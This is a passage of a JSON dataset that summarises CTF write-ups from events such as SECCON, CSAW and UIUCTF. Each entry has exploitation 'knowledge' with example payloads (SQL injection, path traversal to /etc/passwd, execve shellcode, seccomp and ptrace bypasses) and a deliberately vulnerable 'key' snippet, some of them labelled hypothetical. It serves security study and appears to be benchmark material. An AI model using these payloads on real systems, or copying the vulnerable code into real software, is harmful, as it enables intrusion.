            "When facing a system that utilizes hashes to verify credentials, and where the input concatenated before hashing is not properly separated (e.g., username and password concatenated directly), an attacker can exploit this by registering with a slightly modified username and a password that, when concatenated, equals the intended username concatenated with its corresponding password. This is because the hash function (e.g., SHA512) will produce the same output for identical input strings, allowing unauthorized access as the hash stored matches the hash of the manipulated inputs. This approach requires that the system does not enforce unique or isolated input handling mechanisms to prevent such concatenation attacks.\n   \n   Example payload: Registering with username `userA` and password `pass` can potentially allow unauthorized access to a `user` account with password `Apass` if the system concatenates inputs directly before hashing.",
            "In environments where direct input (e.g., `root` username) is blocked or filtered, one can bypass such restrictions by exploiting the system's handling of input concatenation to manipulate hash values for authentication. By strategically adding characters to the end of a restricted username and adjusting the password to include these characters at its beginning, attackers can create a condition where the hash computation remains unaffected, thus bypassing input restrictions without directly confronting security controls.\n\n   Example payload: Register as `rootA` with password `Bpassword` and attempt to log in as `root` with password `ABpassword` to exploit unrestricted hash comparison for authentication bypass, assuming the system concatenates username and password directly and compares their hash against stored values."
        ],
        "key": "```cpp\nclass SecureHashtable {\n    std::unordered_set<std::string> storage;\n\npublic:\n    void insert_keyvalue(const std::string& name, const std::string& password) {\n        std::string hash = sha512(name + password);\n        storage.insert(hash);\n    }\n\n    bool lookup_keyvalue(const std::string& name, const std::string& password) {\n        std::string hash = sha512(name + password);\n        return storage.find(hash) != storage.end();\n    }\n};\n```"
    },
    {
        "name": "secure",
        "write_up": "dataset/raw/secure.md",
        "type": "pwn",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When facing client-side input sanitization or validation, it's important to remember that it can often be bypassed through the modification of the HTTP request after it leaves the browser. Tools like Burp Suite can intercept and modify traffic between the client and server, allowing for direct manipulation of request parameters, including those that have been sanitized client-side. This method is particularly useful in web challenges where inputs are encoded (such as base64) or validated in a way that prevents straightforward injection or manipulation.  \nExample payload manipulation: Changing base64 encoded `username=YWRtaW4%3D` into an SQL injection payload in the HTTP request body.",
            "SQL injection can still be performed even if inputs are sanitized or encoded on the client side, by intercepting and modifying HTTP requests before they reach the server. In scenarios where input is base64 encoded to prevent direct SQL injection, decoding the input server-side does not guarantee security. Attackers can inject SQL commands by encoding their payloads into base64, circumventing client-side defenses but successfully exploiting server-side vulnerabilities.  \nExample payload for SQL injection: `' OR 1=1 --` encoded in base64 and then URL encoded if necessary, placed in the intercepted request to exploit server-side SQL injection vulnerabilities."
        ],
        "key": "```python\ndef login(username, password):\n    query = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"\n    # Execute the query against the database\n    # Vulnerable to SQL Injection\n```"
    },
    {
        "name": "SecureCheck",
        "write_up": "dataset/raw/SecureCheck.md",
        "type": "misc",
        "competition": [
            "Balsn/2019",
            "https://ctftime.org/event/811/tasks/"
        ],
        "score": 330,
        "max_score": 1000,
        "difficulty": 0.33,
        "knowledge": [
            "When facing challenges implementing seccomp filters that restrict system calls, leveraging instructions that are not affected by these filters such as `rdtsc`, `rdtscp`, `rdrand`, or `rdseed` can allow for conditional execution based on unique outcomes of these instructions. These can be used to differentiate code paths between parent and child processes after a `fork()` in scenarios where memory operations in a child do not affect the parent process due to copy-on-write. A practical application of this is to execute different sets of instructions in the parent and child processes based on the randomness or counters provided by these instructions, enabling a bypass of restrictions imposed by seccomp.\n\n    Example payload snippet:\n    ```assembly\n    rdrand eax  \n    and eax, 0x1  \n    cmp ax, 0x1  \n    je SYSCALL\n    ```",
            "In CTF challenges where direct system calls are restricted and identifying the process context (parent or child) is crucial, considering the operational environment like the presence of vDSO (virtual dynamically linked shared object) can guide strategies for bypassing restrictions. Although direct access to vDSO might not be feasible due to cleared register values, using CPU-specific instructions that derive different results on each execution can indirectly achieve execution control. This method is particularly useful in scenarios requiring the execution of certain actions only by either the parent or the child process, not both.\n\n    Example payload continuation:\n    ```assembly\n    SYSCALL:  \n    lea rsp, [rdx+0xf00]  \n    mov rdi, 0x0068732f6e69622f  \n    push rdi  \n    mov rdi, rsp  \n    mov eax, 0x3b  \n    xor esi, esi  \n    xor edx, edx  \n    syscall  \n    ```"
        ],
        "key": "```cpp  \nvoid exit_syscall_filter()  \n{  \n scmp_filter_ctx ctx;  \n ctx = seccomp_init(SCMP_ACT_KILL);  \n seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);  \n seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);  \n seccomp_load(ctx);  \n}\n\nint main() {  \n   int status;  \n   char *buf = mmap(0,  \n                   0x1000,   \n                   PROT_WRITE|PROT_READ|PROT_EXEC,  \n                   MAP_SHARED|MAP_ANONYMOUS, -1, 0);  \n   read(0, buf, 0x1000);  \n  \n   void (*f)() = (void (*)())buf;  \n   if (!fork()) {  \n       exit_syscall_filter();  \n       f();  \n   }  \n   else {  \n       wait(&status);  \n       if(!status)  \n           f();  \n   }  \n}  \n```"
    },
    {
        "name": "security_question",
        "write_up": "dataset/raw/security_question.md",
        "type": "This write-up corresponds to a **web** challenge.",
        "competition": [
            "UIUCTF/2020",
            "https://ctftime.org/event/1075/tasks/"
        ],
        "score": 100,
        "max_score": 666,
        "difficulty": 0.15015015015015015,
        "knowledge": [
            "In web application vulnerabilities related to insecure file handling, if the application concatenates user input directly to form file paths, it can be exploited by supplying an absolute path or using path traversal characters to access arbitrary files. This can be mitigated by validating and sanitizing user input before using it in file system operations. \n   - Example payload for absolute path exploitation: `/getpoem?name=/etc/passwd`\n   - Example payload for directory traversal (although blocked in the given scenario): `/getpoem?name=../../hidden_poem.txt`",
            "The behavior of Python's `os.path.join()` function can lead to security vulnerabilities if not properly understood and handled. Specifically, if an absolute path is supplied as one of the arguments, any paths before it are disregarded, which can lead to unintended file access if user input is included unchecked.\n   - Example usage in a secure scenario: Ensure user input never starts with a slash (`/`) or if it does, the input should be sanitized to prevent absolute path exploitation."
        ],
        "key": "```python\n@app.route('/getpoem')  \ndef get_poem():  \n   poemname = request.args.get('name')\n\n   if not poemname:  \n       return 'Please send a name query:\\n' + str(os.listdir('poems')), 404\n\n   poemdir     = os.path.join(os.getcwd(), 'poems')  \n   poempath    = os.path.join(poemdir, poemname)\n\n   if '..' in poemname:  \n       return 'Illegal substring detected.', 403\n\n   if not os.path.exists(poempath):  \n       return 'File not found.', 404\n\n   return send_file(poempath)  \n```"
    },
    {
        "name": "seed",
        "write_up": "dataset/raw/seed.md",
        "type": "The type of this challenge is `reverse`.",
        "competition": [
            "DamCTF/2021",
            "https://ctftime.org/event/1401/tasks/"
        ],
        "score": 249,
        "max_score": 499,
        "difficulty": 0.49899799599198397,
        "knowledge": [
            "When dealing with pseudorandom number generators (PRNGs), using the current time as a seed could lead to predictable outputs, which compromises the security of generated values. This is important for cryptographic applications, where unpredictability is crucial. In the context of reverse engineering challenges, if the seed for a PRNG is based on a predictable value like the current time, it\u2019s possible to recreate the PRNG's state at the time of the flag's generation by iterating through time values near the creation time until the output matches logged or known wrong attempts.",
            "To reverse-engineer or crack a PRNG-based system, one could adjust the seed in a predictable manner to reproduce the PRNG's state at a certain point. This involves manipulating the seed value in a controlled way, such as decrementing the seed value based on current time to traverse backwards towards the PRNG state when a specific output was generated. By iterating over seed values, starting from a known point and moving in the direction that leads to the state when the desired output was produced, it's possible to find the exact output that includes the flag or other secrets.\n   \n   Sample adjustment in Python for a backtrack approach:\n   ```\n   s = seed()  # Get the current time-based seed\n   while s > 0:\n       s = s - 1\n       # PRNG operations with s as the seed...\n   ```"
        ],
        "key": "```python\ndef seed():  \n   return round(time.time())\n\ndef hash(text):  \n   return hashlib.sha256(str(text).encode()).hexdigest()\n\ndef main():  \n   while True:  \n       s = seed()  \n       random.seed(s, version=2)\n\n       x = random.random()  \n       flag = hash(x)\n\n       if 'b9ff3ebf' in flag:  \n           with open(\"./flag\", \"w\") as f:  \n               f.write(f\"dam{{{flag}}}\")  \n           f.close()  \n           break\n\n       print(f\"Incorrect: {x}\")  \n   print(\"Good job <3\")\n\nif __name__ == \"__main__\":  \n  sys.exit(main())  \n```"
    },
    {
        "name": "selfcet",
        "write_up": "dataset/raw/selfcet.md",
        "type": "pwn",
        "competition": [
            "SECCON/2023/Quals",
            "https://ctftime.org/event/2003/tasks/"
        ],
        "score": 136,
        "max_score": 500,
        "difficulty": 0.272,
        "knowledge": [
            "When faced with the necessity to bypass Control Flow Integrity (CFI) protections such as Intel's Control Flow Enforcement Technology (CET) in a binary compiled without Position Independent Executable (PIE) and lacking a Procedure Linkage Table (PLT), function pointer overwriting can be leveraged to redirect the execution flow. This can be achieved by partially overwriting the least significant bytes of a vulnerable function pointer to point to a different eligible function within libc or the given binary. The conditions for applying this technique include having a known binary base address, the absence of PIE, and a writable function pointer. An instance of partial overwrite could involve altering a function pointer to point to a useful function like `warn` that is close enough to the originally pointed function (`err`) within libc. This approach assumes that the overwrite does not alter the upper bytes, keeping the address within the target function's vicinity.",
            "Exploiting a buffer overflow by injecting specific actions (such as read or write operations) into a program's workflow can be an effective approach when direct exploitation methods (e.g., one_gadget) are impractical due to CFI protections or limitations in writable memory range (e.g., function addresses not fitting into an `int`). Under these constraints, one useful strategy involves leveraging the `atexit()` function to create a loop back to the program\u2019s `main()` function, thereby allowing for multiple writes or reads, which can overcome the limitation of a single buffer overflow opportunity. This method can enable an attacker to prepare the environment (e.g., writing a \"/bin/sh\" string into `.bss`) before executing the desired exploit (e.g., calling `system(\"/bin/sh\")`). Conditions for this technique's applicability include the ability to execute arbitrary functions and the necessity to perform multiple actions to set up the exploit.\n   \nExample payload for looping back to `main()`: `atexit(main)`"
        ],
        "key": "```c\ntypedef struct {  \n char key[KEY_SIZE];  \n char buf[KEY_SIZE];  \n const char *error;  \n int status;  \n void (*throw)(int, const char*, ...);  \n} ctx_t;  \n\nif (ctx->status != 0)  \n   CFI(ctx->throw)(ctx->status, ctx->error);  \n```"
    },
    {
        "name": "Shall we play a game_",
        "write_up": "dataset/raw/Shall we play a game_.md",
        "type": "The type of challenge described in the write-up is a crypto challenge.",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When tackling challenges involving a repetitive task to reveal the flag, such as winning a game a large number of times, an effective approach is to understand and replicate the underlying logic or algorithm of the task programmatically rather than manually engaging in the task. This entails decompiling the app (if it's an Android APK, for example), analyzing the code for any methods related to the win condition, and scripting the process, which can be done by directly invoking these methods in a loop within a modified version of the app or a separate script.",
            "In challenges where cryptographic operations are involved and you have control over or access to some elements of the process (like the initial state of a random number generator, or the input/output of cryptographic functions), programming a sequence of operations akin to those found in the challenge (like hashing a value a million times, or decrypting data with a cipher key derived from specific operations) can unlock the solution. Essential knowledge in cryptographic algorithms (SHA-256 for hashing, AES/ECB for encryption/decryption, etc.) and their implementations in standard libraries (Java, in this case) are critical. Utilize common libraries and functions to mirror the cryptographic process described in the challenge to compute the flag.\n   - Sample cryptographic operation in pseudo-code/java:\n     ```java\n     MessageDigest messageDigest = MessageDigest.getInstance(\"SHA-256\");\n     messageDigest.update(inputBytes);\n     byte[] hash = messageDigest.digest();\n     \n     Cipher cipher = Cipher.getInstance(\"AES/ECB/NoPadding\");\n     SecretKeySpec keySpec = new SecretKeySpec(keyBytes, \"AES\");\n     cipher.init(Cipher.DECRYPT_MODE, keySpec);\n     byte[] result = cipher.doFinal(encryptedBytes);\n     ```"
        ],
        "key": "```java\npublic class GameActivity extends C0433c implements OnClickListener {  \n   C0649a[][] f2327l = ((C0649a[][]) Array.newInstance(C0649a.class, new int[]{3, 3}));// initialises the Cells  \n   ...  \n   Object f2329n = C0644N.m3217_(3, C0644N.f2341h, Long.valueOf((((((((1416127776 + 1869507705) + 544696686) + 1852403303) + 544042870) + 1696622963) + 544108404) + 544501536) + 1886151033));  \n   ...  \n   byte[] f2332q = new byte[32];// empty byte array  \n   byte[] f2333r = new byte[]{(byte) -61, (byte) 15, (byte) 25, (byte) -115, (byte) -46, (byte) -11, (byte) 65, (byte) -3, (byte) 34, (byte) 93, (byte) -39, (byte) 98, (byte) 123, (byte) 17, (byte) 42, (byte) -121, (byte) 60, (byte) 40, (byte) -60, (byte) -112, (byte) 77, (byte) 111, (byte) 34, (byte) 14, (byte) -31, (byte) -4, (byte) -7, (byte) 66, (byte) 116, (byte) 108, (byte) 114, (byte) -122};// pre-filled byte array  \n   public GameActivity() {  \n       C0644N.m3217_(3, C0644N.f2342i, this.f2329n, this.f2332q);// calls the native function  \n       ...  \n   }  \n   C0649a m3210a(List<C0649a> list) {  \n       return (C0649a) list.get(((Random) this.f2329n).nextInt(list.size()));// casts the object got from the native funktion to random and uses it to choose the next cell for the app  \n   }  \n   ...  \n   //this function is called after 1,000,000 wins  \n   void m3214m() {  \n       Object _ = C0644N.m3217_(0, C0644N.f2334a, 0);//native call  \n       Object _2 = C0644N.m3217_(1, C0644N.f2335b, this.f2332q, 1);//native call  \n       C0644N.m3217_(0, C0644N.f2336c, _, 2, _2);//native call  \n       ((TextView) findViewById(R.id.score)).setText(new String((byte[]) C0644N.m3217_(0, C0644N.f2337d, _, this.f2333r)));//print result of native call  \n       ...  \n   }  \n   //this function is called if the player wins  \n   void m3215n() {  \n       ...  \n       this.f2330o++;//increase counter  \n       Object _ = C0644N.m3217_(2, C0644N.f2338e, 2);//native call  \n       C0644N.m3217_(2, C0644N.f2339f, _, this.f2332q);//native call  \n       this.f2332q = (byte[]) C0644N.m3217_(2, C0644N.f2340g, _);//native call  \n       if (this.f2330o == 1000000) {// wuhuuu 1,000,000 wins  \n           m3214m();  \n           return;  \n       }  \n       ((TextView) findViewById(R.id.score)).setText(String.format(\"%d / %d\", new Object[]{Integer.valueOf(this.f2330o), Integer.valueOf(1000000)}));  \n   }  \n   ...  \n}  \n```"
    },
    {
        "name": "shallweplayagame",
        "write_up": "dataset/raw/shallweplayagame.md",
        "type": "reverse",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 476,
        "max_score": 497,
        "difficulty": 0.9577464788732394,
        "knowledge": [
            "When reversing a binary with anti-debug techniques in place, one effective method to bypass a `ptrace`-based anti-debug check is to use GDB to catch `ptrace` syscall execution, forcing the register values to nullify the effect of the `ptrace` check. A program attempting to use `ptrace` with `PTRACE_TRACEME` to detect debugging could be fooled into thinking it is not being debugged by setting the `rax` register to `0` right after the syscall is caught, which essentially makes the `ptrace` call unsuccessful from the program's perspective, allowing the debug session to continue. This technique is particularly useful in scenarios where the program employs simple anti-debugging tactics to deter a straightforward debugging approach.\n   \n   Example GDB commands to bypass ptrace:\n   ```\n   (gdb) catch syscall ptrace\n   (gdb) set $rax = 0\n   (gdb) continue\n   ```",
            "In challenges where input validation checks are performed using mathematical operations or string comparisons, analyzing the comparison logic or breakpoints before comparison-related functions (like `strcmp`, `strncmp` in string checks) can reveal the expected input directly or indirectly. For mathematical operation-based checks, reverse-engineering the calculation allows determining the exact input needed to pass the check. For string comparison-based checks, setting a breakpoint right before the comparison function call and inspecting the comparison function's arguments can help discover the expected string, bypassing the need for guesswork or brute-forcing inputs.\n\n   Example insights for overcoming input validation checks:\n   \n   - For mathematical validation: If a user's input multiplied by a specific number must equal a known value, reverse-engineering the condition reveals the expected input.\n   - For string comparison validation: Setting a breakpoint on `strncmp` and inspecting the arguments (`$rdi`, `$rsi` registers in x64 architecture) to find out the expected string input directly from the memory."
        ],
        "key": "```c\n// sscanf(buffer, \"%d\", &choice);  \nLEA  RAX, [RSP + 0x0C]  \nMOV  RDX, RAX  \nLEA  RSI, \"%d\"  \nLEA  RDI, [0x46c0]  \nMOV  EAX, 0x0  \nCALL __isoc99_sscanf\n\n// if(choice * 0x2A == 0x14153A)  \nMOV  EAX, dword ptr [RSP + 0x0C]  \nIMUL EAX, EAX, 0x2a  \nCMP  EAX, 0x14153a  \nJNZ  LAB_00001cda  \n```"
    },
    {
        "name": "Shamir's Stingy Sharing",
        "write_up": "dataset/raw/Shamir's Stingy Sharing.md",
        "type": "crypto",
        "competition": [
            "RaRCTF/2021",
            "https://ctftime.org/event/1342/tasks/"
        ],
        "score": 200,
        "max_score": 1500,
        "difficulty": 0.13333333333333333,
        "knowledge": [
            "In a challenge involving encryption with a key generated using a random seed, if you can influence or know the seed value, you can replicate the key generation process to decrypt the message. By manipulating input (such as `x` in polynomial calculations) to force the output to reveal information about the seed (or any critical value used in the key generation), the original key can be reconstructed, allowing for decryption of the encrypted content. For instance, by setting `x` to a power of 10 that is significantly larger than the bit length of the seed, the last digits of the resulting sum can expose the seed value when the polynomial sum is structured to leak information about its terms through its magnitude. This method demonstrates a classic example of exploiting weak cryptographic practices in applications.\n\nExample manipulation to expose seed value: Use `x = 10^n` where `n > [bit length of the seed]`.",
            "When dealing with obfuscated or encrypted data where the encryption method involves XOR with a pseudorandom stream generated from a seed, retrieving the seed allows for the exact replication of the pseudorandom stream and hence decryption. This approach exploits flaws in the security of pseudorandom number generators (PRNGs) when initial states (seeds) are not securely chosen or if they can be inferred from the system's outputs. Secure programming practices must avoid such leakage of critical information that could compromise the randomness and unpredictability of cryptographic keys.\n\nExample to decrypt once the seed is known:\n```python\nimport random  \nfrom Crypto.Util.number import long_to_bytes, bytes_to_long\n\n# Assuming encrypted_flag and poly_0 values are known\nencrypted_flag = 'f79ace6c50045d9617387178738bc492c8a36bce6f62065ffd1712060127af'\npoly_0 = 5071636503793964919135745354381215807\n\nrandom.seed(poly_0)  \nkey = long_to_bytes(random.getrandbits(len(encrypted_flag)*4))  \n# XOR the key with the encrypted flag to decrypt\nflag = bxor(long_to_bytes(int(encrypted_flag, 16)), key)  \nprint(flag.decode())\n```\nThis exploit script demonstrates decrypting the flag using the derived seed for key generation."
        ],
        "key": "```python  \nimport random, sys  \nfrom crypto.util.number import long_to_bytes\n\ndef bxor(ba1,ba2):  \n\treturn bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])\n\nbits = 128  \nshares = 30\n\npoly = [random.getrandbits(bits) for _ in range(shares)]  \nflag = open(\"/challenge/flag.txt\",\"rb\").read()\n\nrandom.seed(poly[0])  \nprint(bxor(flag, long_to_bytes(random.getrandbits(len(flag)*8))).hex())\n\ntry:  \n\tx = int(input('Take a share... BUT ONLY ONE. '))  \nexcept:  \n\tprint('Do you know what an integer is?')  \n\tsys.exit(1)  \nif abs(x) < 1:  \n\tprint('No.')  \nelse:  \n\tprint(sum(map(lambda i: poly[i] * pow(x, i), range(len(poly)))))  \n```\n"
    },
    {
        "name": "Shannon Kent",
        "write_up": "dataset/raw/Shannon Kent.md",
        "type": "crypto",
        "competition": [
            "CyberHeroines/2023",
            "https://ctftime.org/event/2054/tasks/"
        ],
        "score": 300,
        "max_score": 400,
        "difficulty": 0.75,
        "knowledge": [
            "When dealing with XOR operations in cryptographic CTF challenges, especially when a key length is explicitly mentioned, analyze the structure of the data that is known to be XORed with the key. For instance, if the flag format (`chctf{`) or any standard file header (like a gzip header) is known, these can be used to recover the XOR key. This approach applies when the XOR key length is equal to or shorter than the known plaintext length. Example payload (for recovering a 6 byte key with a known flag start `chctf{`): `xor_key = xor(known_plaintext_part, encrypted_part)`",
            "In challenges featuring multiple layers of encryption or encoding, reverse the process step by step starting from the outermost layer. This becomes feasible when the specifics of each step are known or can be inferred (e.g., ZIP compression followed by XOR encryption, then GZIP compression). Insight into the encryption or compression method\u2019s header format can significantly aid in deducing the keys or the approach to decryption without needing the keys themselves. This strategy is particularly useful when you're dealing with a stacked encryption or compression without direct access to encryption keys but knowing the algorithms and key lengths."
        ],
        "key": "```python\n# Vulnerable code snippet based on the context\nimport os\nimport gzip\nimport zipfile\nfrom io import BytesIO\n\ndef secure_flag(flag):\n    # XOR flag with random 6 byte key\n    key1 = os.urandom(6)\n    xored_flag = bytes([b ^ key1[i % len(key1)] for i, b in enumerate(flag.encode())])\n\n    # GZIP the result\n    compressed_flag = gzip.compress(xored_flag, compresslevel=9)\n\n    # XOR the compressed result with random 10 byte key\n    key2 = os.urandom(10)\n    xored_compressed_flag = bytes([b ^ key2[i % len(key2)] for i, b in enumerate(compressed_flag)])\n\n    # ZIP the result\n    buffer = BytesIO()\n    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:\n        zf.writestr('data.bin', xored_compressed_flag)\n\n    return buffer.getvalue().hex()\n\n# Example usage\nflag = \"chctf{example_flag}\"\nsecure_flag(flag)\n```\n"
    },
    {
        "name": "shebang",
        "write_up": "dataset/raw/shebang.md",
        "type": "pwn",
        "competition": [
            "ALLES/2020",
            "https://ctftime.org/event/1091/tasks/"
        ],
        "score": 99,
        "max_score": 500,
        "difficulty": 0.198,
        "knowledge": [
            "When faced with a CTF challenge involving executing commands or scripts within constrained environments, it's important to leverage the existing file descriptors (FDs). Specifically, if the environment restricts or filters direct command execution or file access, and you have predefined FDs pointing to essential resources (like a shell or a flag file), you can use redirection or calling mechanisms that utilize these FDs to bypass restrictions.Example payload: `ev/fd/3\\ncat <&9`",
            "In scenarios where code injection or command execution vulnerabilities exist, but are limited by character filters (e.g., disallowing `.`), utilizing system or device files present in directories like `/dev` can serve as an alternative means to execute commands or access functionalities indirectly. This approach is particularly useful when direct command execution paths are blocked, and specific FDs are known to be associated with required actions or data.Example payload: This particular point does not lend itself to a simple payload example as the approach depends highly on the specific system configuration and challenge setup."
        ],
        "key": "```python\n#!/usr/bin/python3 -u  \nimport os  \nimport secrets\n\nNOBODY = 65534  \nNOGROUP = 65534\n\ndef check_input(data):  \n   if b'.' in data:  \n       os._exit(1)\n\ndef main():  \n   os.open('/bin/bash', os.O_RDONLY)  \n   fd = os.open('./flag', os.O_RDONLY)  \n   os.dup2(fd, 9)\n\n   path = os.path.join('/tmp', secrets.token_hex(16))\n\n   print(\"#!/d\", end=\"\")  \n   data = os.read(0, 0x10)  \n   os.close(0)  \n   check_input(data)\n\n   fd = os.open(path, os.O_CREAT | os.O_RDWR, 0o777)  \n   os.write(fd, b'#!/d' + data)  \n   os.close(fd)\n\n   pid = os.fork()  \n   if pid == 0:  \n       os.setresgid(NOGROUP, NOGROUP, NOGROUP)  \n       os.setresuid(NOBODY, NOBODY, NOBODY)  \n       try:  \n           os.execv(path, [path])  \n       except:  \n           os._exit(-1)  \n   else:  \n       os.waitpid(pid, 0)  \n       os.unlink(path)\n\nif __name__ == '__main__':  \n   main()  \n```"
    },
    {
        "name": "Shebang0",
        "write_up": "dataset/raw/Shebang0.md",
        "type": "This write-up describes a forensics challenge as the participant needs to connect via SSH and retrieve the flag from a hidden file.",
        "competition": [
            "CyberYoddha/2020",
            "https://ctftime.org/event/1169/tasks/"
        ],
        "score": 125,
        "max_score": 900,
        "difficulty": 0.1388888888888889,
        "knowledge": [
            "When initial commands do not return the expected results in a Linux environment CTF challenge, such as not showing any files with a simple `ls` command, trying more comprehensive commands like `ls -la` can reveal hidden files. This is because `ls -la` lists all files, including those starting with '.', which are hidden by default in Linux-based systems.",
            "Upon identifying a file with potentially valuable information, such as a hidden flag file in a CTF challenge, the `cat` command can be used to display its contents. This is a fundamental technique for accessing file data directly from the command line without needing to open it in a text editor. \n   - Example payload: `cat .flag.txt`"
        ],
        "key": "```bash\n# Possible vulnerable code snippet based on context\n# This is a hypothetical example of a script that could be vulnerable if it were part of the challenge setup.\n\n#!/bin/bash\n\n# This script is intended to simulate a potential vulnerability in a CTF challenge setup.\n\n# Assume this script is executed with elevated privileges and allows users to read sensitive files.\n\n# Vulnerable code: Using cat to display contents of a sensitive file without proper permission checks\ncat /etc/passwords\n```"
    },
    {
        "name": "Shebang5",
        "write_up": "dataset/raw/Shebang5.md",
        "type": "The type of the challenge described in the write-up is a ***forensics*** challenge.",
        "competition": [
            "CyberYoddha/2020",
            "https://ctftime.org/event/1169/tasks/"
        ],
        "score": 250,
        "max_score": 900,
        "difficulty": 0.2777777777777778,
        "knowledge": [
            "When investigating a system for potential exploitation points, binaries with the SUID bit set should be closely examined. These binaries execute with the permissions of the file's owner, not the user running the binary, which can potentially be abused to escalate privileges. To find such binaries, the `find` command can be utilized with filters to exclude non-relevant paths and to search for files with the SUID bit set. Example command: `find / -path /sys -prune -o -path /proc -prune -o -perm /4000`.",
            "Clues in challenge descriptions or hints can sometimes suggest the use of specific UNIX/Linux commands or permissions to uncover or leverage vulnerabilities. In scenarios where a hint suggests looking for abnormal file permissions or owner-specific files, commands such as `find / -user <username>` can be used to list all files owned by a particular user, which might unveil sensitive files or directories that could be used to obtain further access or information."
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n\nint main(int argc, char *argv[]) {\n    if (argc < 2) {\n        printf(\"Usage: %s <filename>\\n\", argv[0]);\n        return 1;\n    }\n\n    char command[256];\n    snprintf(command, sizeof(command), \"cat %s\", argv[1]);\n    system(command);\n\n    return 0;\n}\n```"
    },
    {
        "name": "Sheepish",
        "write_up": "dataset/raw/Sheepish.md",
        "type": "reverse",
        "competition": [
            "ImaginaryCTF/2023",
            "https://ctftime.org/event/2015/tasks/"
        ],
        "score": 433,
        "max_score": 490,
        "difficulty": 0.8836734693877552,
        "knowledge": [
            "When encountering obfuscated code in a CTF challenge that involves lambda functions, it helps to replace common lambda-calculus terms for known programming constructs with more readable variables and functions. This approach aids in deobfuscation by making the code more understandable. For example, replacing \\(\\lambda\\) terms that represent true, false, and basic arithmetic operations with their Python function equivalents can simplify the analysis and identification of the algorithm being implemented.",
            "In challenges involving complex obfuscated code, identifying and reimplementing the core logic or algorithm in a simpler, more understandable form can be crucial to solving the challenge. Once the main logic, such as arithmetic operations or data structure manipulations (like linked lists), is understood and reimplemented, it can be used to reverse-engineer the input (e.g., a flag) from the obfuscated script's output or behavior. Here is an example of implementing arithmetic operations in Python to decode obfuscated expressions:\n   ```python\n   def plus(x):\n       return lambda y: x + y\n\n   def mult(x):\n       return lambda y: x * y\n\n   def power(x):\n       return lambda y: x ** y\n\n   # Reimplementing these operations allows for decoding encoded messages or flags.\n   ```"
        ],
        "key": "```python\n(lambda x13:((lambda x3:x13(lambda x7:x3(x3)(x7)))(lambda x3:x13(lambda x7:x3(x3)(x7)))))\n```"
    },
    {
        "name": "shell-_code",
        "write_up": "dataset/raw/shell-_code.md",
        "type": "pwn",
        "competition": [
            "CSAW/2018/Quals",
            "https://ctftime.org/event/633/tasks/"
        ],
        "score": -1.0,
        "max_score": 1285,
        "difficulty": -1,
        "knowledge": [
            "When facing stack overflow vulnerabilities where direct shellcode injection is limited by space, breaking the shellcode into multiple segments and utilizing jump instructions to connect these segments can be a viable strategy. This approach is particularly useful when the total amount of payload space is segmented across multiple inputs. The example demonstrates a scenario where shellcode is divided and then control flow is redirected to execute these segmented parts sequentially.",
            "In scenarios where a full `execve(\"/bin/sh\")` shellcode cannot be directly injected due to space constraints, one can place the command string (`\"/bin/sh\"`) right after the area controlled by a buffer overflow, and then use a short stub shellcode to move the stack pointer (`rsp`) to the register holding the first argument (`rdi`) for the `execve` syscall. This technique leverages the fact that `rsp` will point to the command string after the overflow and executes it via a syscall, effectively circumventing the space limitation for traditional shellcode. Example payload part:\n   \n   ```assembly\n   /* Short Stub Shellcode to Execute \"/bin/sh\" Located After Return Address */\n   mov rdi, rsp; /* Move rsp (which points to \"/bin/sh\") into rdi */\n   xor esi, esi; /* Second argument (argv) is set to 0 */\n   cdq; /* Clear EDX register for the third argument (envp), exploiting the fact that cdq sets rdx to 0 if eax is positive (which it is after xor) */\n   push 0x3b; /* Syscall number for execve in rax */\n   pop rax;\n   syscall; /* Invoke the kernel to execute execve(\"/bin/sh\", NULL, NULL) */\n   ```\n\n   This stub is strategically injected into the application's execution flow to ensure that the `execve` syscall is invoked with the intended command string as its argument, exploiting the buffer overflow vulnerability to gain shell access."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid vuln() {\n    char buffer1[15];\n    char buffer2[15];\n    char initials[29];\n\n    printf(\"Enter first part of shellcode: \");\n    gets(buffer1); // Vulnerable to buffer overflow\n\n    printf(\"Enter second part of shellcode: \");\n    gets(buffer2); // Vulnerable to buffer overflow\n\n    printf(\"Enter your initials: \");\n    gets(initials); // Vulnerable to buffer overflow\n\n    printf(\"node.next: %p\\n\", &buffer2);\n}\n\nint main() {\n    vuln();\n    return 0;\n}\n```"
    },
    {
        "name": "Shellcode verifier",
        "write_up": "dataset/raw/Shellcode verifier.md",
        "type": "This write-up is related to a shellcode challenge, which falls under the category of a `pwn` (exploitation) challenge.",
        "competition": [
            "Dragon/2021",
            "https://ctftime.org/event/1457/tasks/"
        ],
        "score": 471,
        "max_score": 471,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting a program that uses `mmap` for file-backed memory mapping, one can leverage the bug described in the `mmap` manual. This bug leads to modifications at the end of a memory-mapped file remaining in the page cache even after the file is unmapped and closed, and these modifications might be visible to subsequent mappings of the same file. This behavior can be exploited to bypass checks on the mapped content by ensuring only a portion of the file is verified while additional, unchecked instructions that have been written past the end of the object can still be executed. This is particularly useful in scenarios where an application verifies a portion of executable code before running it, as it allows an attacker to run unverified code.",
            "In scenarios requiring stealth or bypass of code verification mechanisms, it can be effective to initially write a minimal, non-malicious or less suspicious code segment to the file that will pass verification. Then, leveraging the aforementioned `mmap` bug, additional malicious code can be appended to the executable region in memory. This method ensures that only the initial, non-threatening segment is subjected to verification processes, while the additional code is executed without scrutiny. The process often involves the following steps: creating a file containing trivial or less suspicious code (e.g., a `nop` instruction), mapping this file into memory, appending the malicious code beyond this initial segment, and relying on the operational characteristics of `mmap` to execute the full code, including the appended malicious instructions, while bypassing verification of the added segment.\n\nExample payload steps based on the given strategy:",
